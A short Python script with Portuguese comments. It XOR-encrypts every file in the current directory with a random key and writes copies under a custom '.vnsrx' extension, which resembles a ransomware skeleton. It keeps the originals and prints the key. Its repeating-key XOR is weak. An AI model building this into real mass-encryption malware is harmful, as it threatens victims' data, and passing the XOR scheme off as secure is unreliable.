import os
import random

def generate_random_key(length):
    """Gera uma chave aleatória de bytes."""
    return os.urandom(length)

def encrypt_file(file_name, key):
    """Criptografa o arquivo especificado usando a chave fornecida."""
    try:
        with open(file_name, 'rb') as f:
            data = f.read()
        encrypted_data = bytearray(data)
        for i in range(len(encrypted_data)):
            encrypted_data[i] ^= key[i % len(key)]
        with open(file_name + '.vnsrx', 'wb') as f:
            f.write(encrypted_data)
    except PermissionError:
        print(f"Permissão negada: {file_name}")
    except Exception as e:
        print(f"Erro ao criptografar {file_name}: {e}")

def main():
    # Gera uma chave aleatória de 32 bytes
    key = generate_random_key(32)

    print(f"Chave gerada: {key.hex()}")  # Exibe a chave em formato hexadecimal

    # Nome do arquivo do script
    script_name = os.path.basename(__file__)

    # Lista todos os arquivos no diretório atual
    for file_name in os.listdir('.'):
        # Ignora diretórios, arquivos já criptografados e o próprio script
        if os.path.isfile(file_name) and not file_name.endswith('.vnsrx') and file_name != script_name:
            encrypt_file(file_name, key)

    print("Todos os arquivos foram criptografados.")

if __name__ == "__main__":
    main()
